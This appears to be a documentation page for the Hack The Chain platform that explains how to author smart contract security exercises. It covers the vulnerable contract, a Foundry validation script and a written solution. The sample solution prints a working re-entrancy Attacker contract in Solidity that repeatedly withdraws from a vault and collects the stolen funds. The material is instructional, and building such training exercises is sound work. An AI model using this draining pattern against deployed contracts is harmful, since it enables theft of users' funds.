---
weight: 20
title: "Creating an Exercise"
description: "How to create effective smart contract security exercises for the Hack The Chain."
icon: "draw"
date: "2025-04-01T10:00:00+02:00"
lastmod: "2025-04-01T10:00:00+02:00"
draft: false
toc: true
---

This guide provides detailed instructions on how to create effective smart contract security exercises for Hack The Chain. Whether you're an experienced security researcher or a blockchain enthusiast, follow these steps to create educational and engaging security challenges.

## Overview

Security exercises in Hack The Chain are designed to teach users about common vulnerabilities in smart contracts through practical, hands-on challenges. Each exercise includes:

1. A vulnerable smart contract that contains one or more security flaws
2. A clear objective for what the user needs to exploit
3. A validation method that checks if the user has successfully exploited the vulnerability
4. A detailed solution explaining the vulnerability and how to exploit it

## Exercise Structure

Each exercise contains the following components:

### Basic Information

- **Title**: A descriptive name for your exercise
- **Difficulty Level**: Easy, Moderate, Difficult, or Very Difficult
- **Language**: The programming language used (default is Solidity)
- **Image** (optional): An illustrative image for your exercise

### Description Information

- **Description**: An overview of the scenario and the contract's intended purpose
- **Objective**: What the user needs to achieve to solve the exercise
- **Instructions** (optional): Step-by-step guidance or hints for users

### Code Information

- **Contract Code**: The vulnerable smart contract code
- **Validation Method**: JavaScript code that checks if the exploit was successful
- **Solution**: A detailed explanation of the vulnerability and how to exploit it

## Step-by-Step Guide to Creating an Exercise

### 1. Planning Your Exercise

Before writing any code, consider:

- What vulnerability or security concept do you want to teach?
- What real-world scenario could demonstrate this vulnerability?
- How difficult should the challenge be?
- What background knowledge will users need?

### 2. Writing the Vulnerable Smart Contract

Create a Solidity smart contract that contains your intended vulnerability. Some tips:

- Make the vulnerability subtle but discoverable
- Include realistic functionality to simulate a real-world contract
- Provide enough context in comments to help users understand the contract's purpose
- Ensure the contract compiles successfully

Example:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Simple Storage
 * @dev Simply stores a value
 */
 contract SimpleStorage {
     uint256 private storedData;

     constructor() {
         storedData = 0;
     }

     function setVariable(uint256 x) public {
         storedData = x;
     }

     function getVariable() public view returns (uint256) {
         return storedData;
     }
 }
```

### 3. Creating the Validation Method

The validation method is a Solidity script that verifies whether the user has successfully exploited the vulnerability. This code runs server-side using Foundry to validate the deployed contract's state after exploitation.

Your validation script should:
- Import necessary Foundry scripts (`forge-std/Script.sol`)
- Create an interface for your vulnerable contract
- Access the deployed contract address using environment variables
- Check specific conditions that prove exploitation
- Use `require` statements to validate success conditions

Example validation script:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

// Interface for the vulnerable contract
interface ISimpleStorage {
    function getVariable() external view returns (uint256);
    // Add other necessary functions from your contract
}

contract ValidationScript is Script {
    function run() external {
        address contractAddress = vm.envAddress("CONTRACT_ADDRESS");
        console.log("Checking contract at address:", contractAddress);

        ISimpleStorage target = ISimpleStorage(contractAddress);
        uint256 currentValue = target.getVariable();
        console.log("Current value in contract:", currentValue);

        bool valueChanged = currentValue != 0;
        console.log("Is value different from 0?", valueChanged);

        require(valueChanged, "Value is still 0");
        console.log("Challenge completed successfully!");
    }
}
```

Your script should focus on verifying the end-state of the contract after exploitation, rather than the specific method used to exploit it.

### 4. Writing the Solution

Provide a detailed explanation of:
- What the vulnerability is
- Why it exists in the contract
- How to exploit it
- How to fix the vulnerability

Example solution:

```
# Re-entrancy Vulnerability Solution

This contract is vulnerable to a re-entrancy attack because it updates the user's balance *after* transferring ETH to the user.

## The Vulnerability

In the `withdraw()` function, notice that the contract:
1. Checks the user's balance
2. Sends ETH to the user using `.call{value: amount}("")`
3. Only *after* the transfer updates the user's balance with `balances[msg.sender] -= amount`

This creates a window of opportunity for an attacker to call back into the `withdraw()` function before their balance is updated.

## Exploitation Steps

1. Create an attacker contract with a fallback function that calls back into the vault's withdraw function:

```solidity
contract Attacker {
    TokenVault public vault;

    constructor(address _vaultAddress) {
        vault = TokenVault(_vaultAddress);
    }

    // Function to start the attack
    function attack() external payable {
        // First deposit some ETH
        vault.deposit{value: msg.value}();

        // Then trigger the withdraw to start the re-entrancy
        vault.withdraw(msg.value);
    }

    // Fallback function that gets called when receiving ETH
    receive() external payable {
        // If there's still balance in the vault, withdraw again
        if (address(vault).balance >= msg.value) {
            vault.withdraw(msg.value);
        }
    }

    // Function to retrieve the stolen funds
    function getStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

2. Deploy the attacker contract with the vault's address
3. Call the `attack()` function with some ETH (e.g., 1 ETH)
4. The attacker contract will repeatedly withdraw from the vault before the balance is updated

### 5. Testing Your Exercise

Before asking for a verification or te be public :

1. Create a new exercise in the platform
2. Enter all the required information
3. Deploy the contract using the platform's interface
4. Try to exploit your own vulnerability to ensure it works as expected
5. Check that the validation method correctly identifies when the exploitation is successful

### 6. Submitting for Verification

Once your exercise is created:

1. Click "Request Verification" to have administrators review your exercise
2. If the exercise passes the verification process, it can be made public for all users to access
3. Alternatively, you can keep it private and share the direct link with specific users

## Best Practices for Creating Effective Exercises

1. **Be Educational**: Focus on teaching a specific security concept or vulnerability
2. **Provide Context**: Create a realistic scenario that helps users understand real-world implications
3. **Clear Objectives**: Clearly state what users need to accomplish
4. **Progressive Difficulty**: Start with simpler vulnerabilities and progress to more complex ones
5. **Comprehensive Solution**: Explain not just how to exploit, but also how to fix the vulnerability
6. **Test Thoroughly**: Ensure your validation method correctly identifies both successful and failed attempts

## Available Context in Validation Scripts

When writing your validation script, you have access to the following environment variables and Foundry utilities:

| Variable/Function | Description |
|----------|-------------|
| `vm.envAddress("CONTRACT_ADDRESS")` | The address of the deployed vulnerable contract |

The validation script executes against the actual deployed contract on the testnet.

## Conclusion

Creating high-quality exercises for the Hack The Chain platform helps to educate users about smart contract security in an engaging, hands-on way. By sharing your expertise through well-crafted challenges, you contribute to improving the security practices of the entire blockchain community.

If you have questions or need assistance creating your exercise, feel free to reach out to the platform administrators.
